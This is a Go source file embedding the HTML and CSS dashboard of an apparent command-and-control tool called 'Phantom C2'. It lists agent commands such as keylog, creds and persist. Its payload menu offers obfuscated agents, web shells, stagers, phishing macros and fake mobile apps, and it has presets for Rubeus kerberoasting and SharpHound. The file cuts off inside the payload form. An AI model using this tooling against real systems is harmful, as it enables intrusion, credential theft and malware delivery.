package webui

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phantom C2</title>
<style>
:root, [data-theme="dark"] {
  --bg-primary: #0a0e1a;
  --bg-secondary: #111827;
  --bg-card: #1a1f35;
  --bg-hover: #242b45;
  --bg-input: #0d1224;
  --border: #2a3050;
  --border-light: #374160;
  --text-primary: #e8ecf4;
  --text-secondary: #8892b0;
  --text-muted: #5a6580;
  --accent: #7c3aed;
  --accent-light: #a78bfa;
  --accent-glow: rgba(124, 58, 237, 0.15);
  --green: #10b981;
  --green-dim: rgba(16, 185, 129, 0.15);
  --red: #ef4444;
  --red-dim: rgba(239, 68, 68, 0.15);
  --yellow: #f59e0b;
  --yellow-dim: rgba(245, 158, 11, 0.15);
  --blue: #3b82f6;
  --blue-dim: rgba(59, 130, 246, 0.15);
  --cyan: #06b6d4;
  --radius: 8px;
  --radius-lg: 12px;
  --shadow: 0 4px 24px rgba(0,0,0,0.3);
}
[data-theme="light"] {
  --bg-primary: #f0f2f5;
  --bg-secondary: #ffffff;
  --bg-card: #ffffff;
  --bg-hover: #e8eaed;
  --bg-input: #f8f9fa;
  --border: #d1d5db;
  --border-light: #e5e7eb;
  --text-primary: #1f2937;
  --text-secondary: #4b5563;
  --text-muted: #9ca3af;
  --accent: #7c3aed;
  --accent-light: #6d28d9;
  --accent-glow: rgba(124, 58, 237, 0.1);
  --green: #059669;
  --green-dim: rgba(5, 150, 105, 0.1);
  --red: #dc2626;
  --red-dim: rgba(220, 38, 38, 0.1);
  --yellow: #d97706;
  --yellow-dim: rgba(217, 119, 6, 0.1);
  --blue: #2563eb;
  --blue-dim: rgba(37, 99, 235, 0.1);
  --cyan: #0891b2;
  --shadow: 0 4px 24px rgba(0,0,0,0.08);
}

* { margin:0; padding:0; box-sizing:border-box; }
body { background: var(--bg-primary); color: var(--text-primary); font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif; font-size: 13px; line-height: 1.5; }
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg-primary); }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

/* ══════ TOPBAR ══════ */
.topbar {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 0 20px;
  height: 52px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: sticky; top: 0; z-index: 200;
}
.topbar-left { display: flex; align-items: center; gap: 14px; }
.brand {
  display: flex; align-items: center; gap: 10px;
  font-size: 17px; font-weight: 700; color: var(--accent-light);
  letter-spacing: -0.3px;
}
.brand-icon {
  width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;
}
.brand-icon svg { width: 36px; height: 36px; filter: drop-shadow(0 0 6px rgba(124,58,237,0.5)); }
.brand small { font-size: 10px; color: var(--text-muted); font-weight: 400; margin-left: 4px; }
.topbar-center { display: flex; flex: 1; }
.topbar-right { display: flex; align-items: center; gap: 10px; }
.pulse { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); animation: pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
.top-label { font-size: 11px; color: var(--text-muted); }

/* ══════ LAYOUT ══════ */
.app { display: flex; height: calc(100vh - 52px); }
.sidebar {
  width: 82px; background: var(--bg-secondary); border-right: 1px solid var(--border);
  display: flex; flex-direction: column; align-items: center; padding: 14px 0; gap: 2px;
  overflow-y: auto;
}
.sidebar-btn {
  width: 68px; padding: 8px 4px 6px; border-radius: 10px; border: none; cursor: pointer;
  background: transparent; color: var(--text-muted); font-size: 24px;
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  gap: 3px; transition: all 0.2s; position: relative;
}
.sidebar-btn .sb-label {
  font-size: 9px; font-weight: 600; letter-spacing: 0.3px; text-transform: uppercase;
}
.sidebar-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
.sidebar-btn.active { background: var(--accent-glow); color: var(--accent-light); }
.sidebar-btn .badge-count {
  position: absolute; top: 2px; right: 6px; width: 18px; height: 18px;
  background: var(--red); color: white; border-radius: 50%; font-size: 9px;
  display: flex; align-items: center; justify-content: center; font-weight: 700;
}
.sidebar-divider { width: 48px; height: 1px; background: var(--border); margin: 6px 0; }
.content { flex: 1; overflow-y: auto; padding: 20px; }
.page { display: none; } .page.active { display: block; }

/* ══════ STATS ══════ */
.stats-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 14px; margin-bottom: 20px; }
.stat-card {
  background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg);
  padding: 18px; position: relative; overflow: hidden;
}
.stat-card::after {
  content: ''; position: absolute; top: 0; right: 0; width: 60px; height: 60px;
  border-radius: 50%; filter: blur(30px); opacity: 0.15;
}
.stat-card.purple::after { background: var(--accent); }
.stat-card.green::after { background: var(--green); }
.stat-card.blue::after { background: var(--blue); }
.stat-card.yellow::after { background: var(--yellow); }
.stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.2px; font-weight: 600; }
.stat-value { font-size: 32px; font-weight: 800; margin-top: 6px; letter-spacing: -1px; }
.stat-value.purple { color: var(--accent-light); }
.stat-value.green { color: var(--green); }
.stat-value.blue { color: var(--blue); }
.stat-value.yellow { color: var(--yellow); }
.stat-sub { font-size: 11px; color: var(--text-muted); margin-top: 4px; }

/* ══════ CARDS / PANELS ══════ */
.card {
  background: var(--bg-card); border: 1px solid var(--border);
  border-radius: var(--radius-lg); margin-bottom: 16px; overflow: hidden;
}
.card-header {
  padding: 14px 18px; border-bottom: 1px solid var(--border);
  display: flex; justify-content: space-between; align-items: center;
}
.card-header h3 { font-size: 13px; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
.card-header h3 span { font-size: 15px; }
.card-body { padding: 0; }
.card-body.padded { padding: 18px; }

/* ══════ TABLE ══════ */
table { width: 100%; border-collapse: collapse; }
th {
  padding: 10px 16px; text-align: left; font-size: 10px; text-transform: uppercase;
  letter-spacing: 1.2px; color: var(--text-muted); font-weight: 600;
  background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border);
}
td { padding: 11px 16px; border-bottom: 1px solid rgba(42,48,80,0.5); font-size: 13px; }
tr { transition: background 0.15s; }
tr:hover td { background: var(--bg-hover); }
tr.clickable { cursor: pointer; }

/* ══════ BADGES ══════ */
.badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600;
}
.b-active { background: var(--green-dim); color: var(--green); }
.b-running { background: var(--green-dim); color: var(--green); }
.b-complete { background: var(--blue-dim); color: var(--blue); }
.b-dormant { background: var(--yellow-dim); color: var(--yellow); }
.b-pending { background: var(--yellow-dim); color: var(--yellow); }
.b-sent { background: var(--accent-glow); color: var(--accent-light); }
.b-dead { background: var(--red-dim); color: var(--red); }
.b-stopped { background: var(--red-dim); color: var(--red); }
.b-error { background: var(--red-dim); color: var(--red); }
.badge-dot { width: 6px; height: 6px; border-radius: 50%; }
.b-active .badge-dot { background: var(--green); box-shadow: 0 0 6px var(--green); }
.b-dormant .badge-dot { background: var(--yellow); }
.b-dead .badge-dot { background: var(--red); }

/* ══════ AGENT CARDS ══════ */
.agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 14px; padding: 18px; }
.agent-card {
  background: var(--bg-secondary); border: 1px solid var(--border); border-radius: var(--radius-lg);
  padding: 16px; cursor: pointer; transition: all 0.2s;
}
.agent-card:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); transform: translateY(-1px); }
.agent-top { display: flex; justify-content: space-between; align-items: start; margin-bottom: 12px; }
.agent-name { font-size: 15px; font-weight: 700; color: var(--accent-light); }
.agent-os { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text-secondary); margin-top: 3px; }
.agent-details { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
.agent-detail { }
.agent-detail-label { font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; }
.agent-detail-value { font-size: 13px; color: var(--text-primary); margin-top: 1px; }

/* ══════ TERMINAL ══════ */
.terminal {
  background: #0c0f1a; border: 1px solid var(--border); border-radius: var(--radius-lg);
  overflow: hidden; box-shadow: var(--shadow);
}
.term-bar {
  background: #151929; padding: 10px 16px; display: flex; align-items: center;
  gap: 8px; border-bottom: 1px solid var(--border);
}
.term-dot { width: 11px; height: 11px; border-radius: 50%; }
.term-dot.r { background: #ff5f57; } .term-dot.y { background: #febc2e; } .term-dot.g { background: #28c840; }
.term-title { color: var(--text-muted); font-size: 12px; margin-left: 10px; font-weight: 500; }
.term-body {
  padding: 16px; min-height: 300px; max-height: 450px; overflow-y: auto;
  font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
  font-size: 13px; line-height: 1.7;
}
.term-line { color: var(--green); }
.term-error { color: var(--red); }
.term-info { color: var(--blue); }
.term-output { color: var(--text-primary); white-space: pre-wrap; word-break: break-all; }
.term-input-row {
  display: flex; align-items: center; padding: 10px 16px;
  background: #0a0d18; border-top: 1px solid var(--border);
}
.term-prompt {
  color: var(--accent-light); font-family: monospace; font-size: 13px;
  margin-right: 8px; white-space: nowrap; font-weight: 600;
}
.term-input {
  flex: 1; background: none; border: none; color: var(--text-primary);
  font-family: monospace; font-size: 13px; outline: none; caret-color: var(--accent-light);
}

/* ══════ QUICK ACTIONS ══════ */
.quick-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 14px; }
.qbtn {
  padding: 6px 12px; border-radius: 6px; border: 1px solid var(--border);
  background: var(--bg-card); color: var(--text-secondary); cursor: pointer;
  font-size: 11px; font-weight: 500; transition: all 0.15s;
  font-family: monospace;
}
.qbtn:hover { border-color: var(--accent); color: var(--accent-light); background: var(--accent-glow); }
.qbtn.danger { border-color: rgba(239,68,68,0.3); }
.qbtn.danger:hover { border-color: var(--red); color: var(--red); background: var(--red-dim); }

/* ══════ SELECT ══════ */
.select-wrap { position: relative; }
.select-wrap select {
  appearance: none; background: var(--bg-input); border: 1px solid var(--border);
  color: var(--text-primary); padding: 8px 32px 8px 12px; border-radius: var(--radius);
  font-size: 12px; cursor: pointer; outline: none; min-width: 200px;
}
.select-wrap::after {
  content: '▾'; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
  color: var(--text-muted); pointer-events: none; font-size: 12px;
}

/* ══════ EVENT LOG ══════ */
.event-log {
  font-family: monospace; font-size: 12px; padding: 16px; max-height: 500px;
  overflow-y: auto; line-height: 1.8;
}
.event-item { color: var(--text-muted); padding: 2px 0; }
.event-item:hover { color: var(--text-secondary); }

/* ══════ EMPTY STATE ══════ */
.empty { text-align: center; padding: 48px 20px; color: var(--text-muted); }
.empty-icon { font-size: 40px; margin-bottom: 12px; opacity: 0.5; }
.empty-text { font-size: 14px; }
.empty-sub { font-size: 12px; margin-top: 6px; }

/* ══════ RESPONSIVE ══════ */
@media (max-width: 900px) {
  .stats-grid { grid-template-columns: repeat(2,1fr); }
  .agent-grid { grid-template-columns: 1fr; }
  .sidebar { display: none; }
}
</style>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <div class="topbar-left">
    <div class="brand">
      <div class="brand-icon"><svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg">
        <defs><linearGradient id="b2grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#a78bfa"/><stop offset="100%" style="stop-color:#6d28d9"/></linearGradient></defs>
        <!-- B-2 Spirit Stealth Bomber silhouette -->
        <path d="M50 8 L15 30 L2 28 L8 32 L15 35 L28 38 L42 42 L50 44 L58 42 L72 38 L85 35 L92 32 L98 28 L85 30 Z" fill="url(#b2grad)" stroke="none"/>
        <path d="M50 12 L35 28 L50 36 L65 28 Z" fill="rgba(10,14,26,0.4)" stroke="none"/>
        <circle cx="50" cy="26" r="2" fill="#a78bfa" opacity="0.8"/>
      </svg></div>
      Phantom <small>C2</small>
    </div>
  </div>
  <div class="topbar-center"></div>
  <div class="topbar-right">
    <span class="top-label" id="engagement-timer" title="Engagement duration">⏱ 00:00:00</span>
    <button onclick="toggleNotifications()" style="background:none;border:none;cursor:pointer;font-size:16px;position:relative" id="notif-btn" title="Toggle browser notifications">🔔</button>
    <button onclick="generateReport()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Generate report">📄 Report</button>
    <button onclick="exportData()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Export JSON">📥 Export</button>
    <button onclick="configureWebhook()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Configure webhook">🔗</button>
    <div class="pulse"></div>
    <span class="top-label">Online</span>
    <a href="/logout" style="background:none;border:none;cursor:pointer;font-size:13px;color:var(--red);text-decoration:none;margin-left:8px" title="Logout">⏻ Logout</a>
  </div>
</div>

<div class="app">
  <!-- SIDEBAR ICONS -->
  <div class="sidebar">
    <button class="sidebar-btn active" onclick="nav('dashboard')" title="Dashboard">📊<span class="sb-label">Dashboard</span></button>
    <button class="sidebar-btn" onclick="nav('agents')" title="Agents">
      🖥️<span class="sb-label">Agents</span><span class="badge-count" id="sb-agents" style="display:none">0</span>
    </button>
    <button class="sidebar-btn" onclick="nav('listeners')" title="Listeners">📡<span class="sb-label">Listeners</span></button>
    <button class="sidebar-btn" onclick="nav('tasks')" title="Tasks">📋<span class="sb-label">Tasks</span></button>
    <div class="sidebar-divider"></div>
    <button class="sidebar-btn" onclick="nav('terminal')" title="Terminal">💻<span class="sb-label">Terminal</span></button>
    <button class="sidebar-btn" onclick="nav('payloads')" title="Payloads">🔧<span class="sb-label">Payloads</span></button>
    <button class="sidebar-btn" onclick="nav('files')" title="Files">📂<span class="sb-label">Files</span></button>
    <button class="sidebar-btn" onclick="nav('creds')" title="Credentials">🔑<span class="sb-label">Creds</span></button>
    <button class="sidebar-btn" onclick="nav('loot')" title="Loot">🎯<span class="sb-label">Loot</span></button>
    <button class="sidebar-btn" onclick="nav('pivotgraph')" title="Pivot Map">🗺️<span class="sb-label">Pivot Map</span></button>
    <button class="sidebar-btn" onclick="nav('ioc')" title="IOC Tracker">🚨<span class="sb-label">IOC</span></button>
    <div class="sidebar-divider"></div>
    <button class="sidebar-btn" onclick="nav('templates')" title="Command Templates">📑<span class="sb-label">Templates</span></button>
    <button class="sidebar-btn" onclick="nav('audit')" title="Audit Log">📝<span class="sb-label">Audit</span></button>
    <button class="sidebar-btn" onclick="nav('events')" title="Events">📜<span class="sb-label">Events</span></button>
    <button class="sidebar-btn" onclick="nav('settings')" title="Settings">⚙️<span class="sb-label">Settings</span></button>
    <div style="flex:1"></div>
    <button class="sidebar-btn" onclick="toggleTheme()" title="Toggle Theme" id="theme-btn">🌙<span class="sb-label">Theme</span></button>
  </div>

  <div class="content">

    <!-- ══════ DASHBOARD ══════ -->
    <div id="p-dashboard" class="page active">
      <div class="stats-grid">
        <div class="stat-card green"><div class="stat-label">Active Agents</div><div class="stat-value green" id="s-agents">0</div><div class="stat-sub" id="s-agents-sub">No agents connected</div></div>
        <div class="stat-card purple"><div class="stat-label">Listeners</div><div class="stat-value purple" id="s-listeners">0</div><div class="stat-sub" id="s-listeners-sub">—</div></div>
        <div class="stat-card blue"><div class="stat-label">Tasks Completed</div><div class="stat-value blue" id="s-tasks">0</div><div class="stat-sub" id="s-tasks-sub">—</div></div>
        <div class="stat-card yellow"><div class="stat-label">Events</div><div class="stat-value yellow" id="s-events">0</div><div class="stat-sub" id="s-events-sub">—</div></div>
      </div>

      <!-- Beacon Graphs Row -->
      <div style="display:grid; grid-template-columns:2fr 1fr 1fr; gap:14px; margin-bottom:16px;">
        <!-- Beacon Timeline Graph -->
        <div class="card">
          <div class="card-header"><h3><span>📈</span> Beacon Activity</h3><span style="font-size:11px;color:var(--text-muted)">Last 60 minutes</span></div>
          <div class="card-body" style="padding:16px;">
            <canvas id="beacon-chart" height="140"></canvas>
          </div>
        </div>
        <!-- OS Distribution -->
        <div class="card">
          <div class="card-header"><h3><span>🎯</span> Targets by OS</h3></div>
          <div class="card-body" style="padding:20px;">
            <canvas id="os-chart" height="150"></canvas>
          </div>
        </div>
        <!-- Session Status -->
        <div class="card">
          <div class="card-header"><h3><span>⚡</span> Session Health</h3></div>
          <div class="card-body" style="padding:20px;" id="session-health">
            <div class="empty" style="padding:20px"><div class="empty-icon" style="font-size:28px">📊</div><div class="empty-sub">No sessions yet</div></div>
          </div>
        </div>
      </div>

      <!-- Network Topology (Cobalt Strike graph view) -->
      <div class="card">
        <div class="card-header"><h3><span>🌐</span> Network Graph</h3><span style="font-size:11px;color:var(--text-muted)">Beacon topology</span></div>
        <div class="card-body" style="padding:0; background:#080c16;">
          <canvas id="network-graph" height="320" style="width:100%;cursor:default;"></canvas>
        </div>
      </div>

      <div style="height:14px"></div>

      <div class="card">
        <div class="card-header"><h3><span>🖥️</span> Connected Agents</h3></div>
        <div class="card-body" id="dash-agents-wrap">
          <div class="empty"><div class="empty-icon">📡</div><div class="empty-text">Waiting for agents...</div><div class="empty-sub">Deploy an agent to get started</div></div>
        </div>
      </div>

      <div class="card">
        <div class="card-header"><h3><span>📋</span> Recent Activity</h3></div>
        <div class="card-body"><table><thead><tr><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th></tr></thead><tbody id="dash-tasks"></tbody></table></div>
      </div>
    </div>

    <!-- ══════ AGENTS ══════ -->
    <div id="p-agents" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🖥️</span> All Agents</h3>
          <div style="display:flex;gap:6px">
            <button class="qbtn" onclick="bulkSelectAll()" style="font-size:11px">Select All</button>
            <input id="bulk-cmd" placeholder="Command for selected agents..." style="padding:5px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;width:250px">
            <button class="qbtn" onclick="bulkSendCmd()" style="font-size:11px;background:var(--accent-glow);color:var(--accent-light)">Run on Selected</button>
            <button class="qbtn" onclick="bulkRemoveDead()" style="font-size:11px;color:var(--red)">Remove Dead</button>
          </div>
        </div>
        <div class="card-body"><table>
          <thead><tr><th style="width:30px"><input type="checkbox" id="bulk-all" onchange="bulkToggleAll(this)"></th><th>Name</th><th>OS</th><th>Hostname</th><th>User</th><th>IP</th><th>Sleep</th><th>Last Seen</th><th>Status</th><th></th></tr></thead>
          <tbody id="all-agents"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ LISTENERS ══════ -->
    <div id="p-listeners" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px;">

        <!-- Active Listeners -->
        <div class="card">
          <div class="card-header"><h3><span>📡</span> Active Listeners</h3></div>
          <div class="card-body"><table>
            <thead><tr><th>Name</th><th>Type</th><th>Bind Address</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="all-listeners"></tbody>
          </table></div>
        </div>

        <!-- Saved Presets -->
        <div class="card">
          <div class="card-header"><h3><span>💾</span> Saved Presets</h3></div>
          <div class="card-body">
            <div id="presets-list" style="margin-bottom:12px;"></div>
          </div>
        </div>
      </div>

      <!-- Create / Save New Listener -->
      <div class="card">
        <div class="card-header"><h3><span>➕</span> Create Listener</h3></div>
        <div class="card-body padded">
          <div style="display:grid;grid-template-columns:1fr 1fr 2fr 1fr;gap:10px;align-items:end;">
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Name</label>
              <input type="text" id="ln-name" placeholder="my-listener" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
            </div>
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Type</label>
              <select id="ln-type" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                <option value="http">HTTP</option>
                <option value="https">HTTPS</option>
                <option value="tcp">TCP (Raw)</option>
                <option value="dns">DNS</option>
                <option value="smb">SMB (Named Pipe)</option>
              </select>
            </div>
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Bind Address</label>
              <input type="text" id="ln-bind" placeholder="0.0.0.0:8080" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
            </div>
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Profile</label>
              <select id="ln-profile" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                <option value="default">Default</option>
                <option value="microsoft">Microsoft 365</option>
                <option value="cloudflare">Cloudflare</option>
              </select>
            </div>
          </div>
          <div style="display:flex;gap:8px;margin-top:12px;">
            <button class="btn" onclick="createListener(false)" style="padding:8px 18px;font-size:13px;">🚀 Create & Start</button>
            <button class="btn" onclick="createListener(true)" style="padding:8px 18px;font-size:13px;background:var(--green);">💾 Create, Start & Save Preset</button>
            <button class="qbtn" onclick="savePresetOnly()" style="padding:8px 14px;font-size:12px;">💾 Save as Preset Only</button>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ TASKS ══════ -->
    <div id="p-tasks" class="page">
      <div class="card">
        <div class="card-header"><h3><span>📋</span> Task History</h3></div>
        <div class="card-body"><table>
          <thead><tr><th>ID</th><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th><th style="max-width:300px">Output</th></tr></thead>
          <tbody id="all-tasks"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ TERMINAL ══════ -->
    <div id="p-terminal" class="page">
      <div style="display:flex; gap:12px; align-items:center; margin-bottom:14px;">
        <span style="color:var(--text-muted); font-size:12px; font-weight:600; text-transform:uppercase; letter-spacing:1px;">Target</span>
        <div class="select-wrap">
          <select id="agent-select" onchange="onAgentSelect()">
            <option value="">Select an agent...</option>
          </select>
        </div>
        <span id="agent-badge-area"></span>
        <div style="margin-left:auto;display:flex;gap:8px;align-items:center">
          <input type="number" id="agent-sleep" placeholder="Sleep" style="width:60px;padding:5px 8px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px" title="Sleep seconds">
          <input type="number" id="agent-jitter" placeholder="Jitter" style="width:60px;padding:5px 8px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px" title="Jitter %">
          <button class="qbtn" onclick="updateSleep()" style="font-size:11px;padding:5px 10px" title="Update agent sleep/jitter">Set Sleep</button>
          <button class="qbtn" onclick="setKillDate()" style="font-size:11px;padding:5px 10px;color:var(--red)" title="Set agent kill date">Kill Date</button>
        </div>
      </div>

      <div class="quick-actions">
        <button class="qbtn" onclick="sendShell('whoami')">whoami</button>
        <button class="qbtn" onclick="sendShell('id')">id</button>
        <button class="qbtn" onclick="sendShell('hostname')">hostname</button>
        <button class="qbtn" onclick="quickCmd('sysinfo')">sysinfo</button>
        <button class="qbtn" onclick="quickCmd('ps')">ps</button>
        <button class="qbtn" onclick="quickCmd('screenshot')">screenshot</button>
        <button class="qbtn" onclick="quickCmd('evasion')">evasion</button>
        <button class="qbtn" onclick="sendShell('ipconfig /all')">ipconfig</button>
        <button class="qbtn" onclick="sendShell('ifconfig')">ifconfig</button>
        <button class="qbtn danger" onclick="quickCmd('kill')">kill</button>
        <span style="color:var(--border);margin:0 4px">|</span>
        <button class="qbtn" onclick="startTunnel()" style="background:var(--blue-dim);color:var(--blue)">SOCKS Proxy</button>
        <button class="qbtn" onclick="stopTunnel()" style="background:var(--red-dim);color:var(--red);font-size:10px">Stop Tunnel</button>
      </div>

      <div class="terminal">
        <div class="term-bar">
          <div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div>
          <span class="term-title" id="term-title">Phantom C2 — Select an agent to begin</span>
        </div>
        <div class="term-body" id="term-body">
          <div class="term-info">Welcome to Phantom C2 Interactive Terminal</div>
          <div class="term-info">Select an agent above, then type commands below.</div>
          <div class="term-info" style="color:var(--text-muted)">Commands: shell, sysinfo, ps, screenshot, download, persist, sleep, kill</div>
          <div class="term-info" style="color:var(--text-muted)">          token, keylog, socks, portfwd, creds, pivot, evasion, ad-*</div>
          <div>&nbsp;</div>
        </div>
        <div class="term-input-row">
          <span class="term-prompt" id="term-prompt">phantom &gt;</span>
          <input class="term-input" id="term-input" placeholder="Type a command..." onkeydown="if(event.key==='Enter')sendTermCmd()" autofocus>
        </div>
      </div>

      <!-- .NET Assembly Quick Execute (below terminal) -->
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
        <div class="card">
          <div class="card-header"><h3><span>⚡</span> Upload & Execute .NET Assembly</h3></div>
          <div class="card-body padded">
            <input type="file" id="term-asm-file" style="display:none" accept=".exe,.dll" onchange="termAsmFileSelected(this)">
            <div style="padding:12px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer;margin-bottom:8px" onclick="document.getElementById('term-asm-file').click()" id="term-asm-dropzone">
              <span style="font-size:11px;color:var(--text-muted)">Click to select .NET assembly (.exe/.dll)</span>
            </div>
            <div style="display:flex;gap:6px">
              <input id="term-asm-args" placeholder="Arguments (e.g. -group=all)" style="flex:1;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              <button class="btn" onclick="termExecuteAssembly()" style="padding:7px 16px;font-size:12px">⚡ Run</button>
            </div>
            <div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:8px">
              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=all'" style="font-size:9px;padding:3px 8px">Seatbelt -group=all</button>
              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='kerberoast'" style="font-size:9px;padding:3px 8px">Rubeus kerberoast</button>
              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-c All'" style="font-size:9px;padding:3px 8px">SharpHound -c All</button>
              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='find /vulnerable'" style="font-size:9px;padding:3px 8px">Certify vulnerable</button>
            </div>
          </div>
        </div>
        <div class="card">
          <div class="card-header"><h3><span>📤</span> Upload File to Agent</h3></div>
          <div class="card-body padded">
            <input type="file" id="term-upload-file" style="display:none" onchange="termUploadFileSelected(this)">
            <div style="padding:12px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer;margin-bottom:8px" onclick="document.getElementById('term-upload-file').click()" id="term-upload-dropzone">
              <span style="font-size:11px;color:var(--text-muted)">Click to select file to upload</span>
            </div>
            <div style="display:flex;gap:6px">
              <input id="term-upload-path" placeholder="Remote path (auto if empty)" style="flex:1;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              <button class="btn" onclick="termUploadFile()" style="padding:7px 16px;font-size:12px">📤 Upload</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ PAYLOADS ══════ -->
    <div id="p-payloads" class="page">
      <div class="stats-grid" style="grid-template-columns:repeat(3,1fr); margin-bottom:16px;">
        <div class="stat-card purple"><div class="stat-label">Agent Binaries</div><div class="stat-value purple">4</div></div>
        <div class="stat-card blue"><div class="stat-label">Web Shells & Stagers</div><div class="stat-value blue">8</div></div>
        <div class="stat-card yellow"><div class="stat-label">Mobile Payloads</div><div class="stat-value yellow">3+</div></div>
      </div>

      <!-- Generator Form -->
      <div class="card">
        <div class="card-header"><h3><span>🔧</span> Payload Generator</h3></div>
        <div class="card-body padded">
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">

            <!-- Left: Config -->
            <div>
              <div style="margin-bottom:12px;">
                <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Payload Type</label>
                <select id="pl-type" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onchange="onPayloadTypeChange()">
                  <optgroup label="Agent Binaries">
                    <option value="exe">🪟 Windows EXE (amd64)</option>
                    <option value="exe-garble">🪟 Windows EXE (Obfuscated)</option>
                    <option value="elf">🐧 Linux ELF (amd64)</option>
                    <option value="elf-garble">🐧 Linux ELF (Obfuscated)</option>
                  </optgroup>
                  <optgroup label="Web Shells">
                    <option value="aspx">🌐 ASPX Web Shell (IIS)</option>
                    <option value="php">🌐 PHP Web Shell</option>
                    <option value="jsp">🌐 JSP Web Shell (Tomcat)</option>
                  </optgroup>
                  <optgroup label="Stagers">
                    <option value="powershell">💻 PowerShell Stager</option>
                    <option value="bash">💻 Bash Stager</option>
                    <option value="python">🐍 Python Stager</option>
                  </optgroup>
                  <optgroup label="Phishing">
                    <option value="hta">📧 HTA Application</option>
                    <option value="vba">📧 VBA Macro</option>
                  </optgroup>
                  <optgroup label="Mobile">
                    <option value="android">📱 Android Payload Pack</option>
                    <option value="ios">🍎 iOS Payload Pack</option>
                    <option value="app">📲 Fake Mobile App (30+ templates)</option>
                  </optgroup>
                </select>
              </div>

              <div style="margin-bottom:12px;">
